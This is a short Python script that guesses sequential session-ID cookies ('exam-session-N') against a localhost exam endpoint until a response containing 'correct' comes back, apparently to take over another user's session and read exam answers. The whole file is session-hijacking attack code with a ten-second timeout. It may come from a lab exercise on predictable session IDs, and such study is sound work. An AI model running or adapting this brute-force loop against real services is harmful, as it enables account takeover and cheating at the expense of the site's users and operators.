import requests
import time

adress = "http://localhost:8000/exam/answer_1"
i = 0
start_time = time.time()
TIMEOUT = 10
while True:
    # Attempt to brute-force the session ID
    response = requests.get(adress, cookies={"sessionid": f"exam-session-{i}"}).text
    i += 1
    if "correct" in response:
        print(response)
        break

    # Check timeout
    if time.time() - start_time > TIMEOUT:
        print("Couldn't find the session ID in " + str(TIMEOUT) + " seconds.")
        break
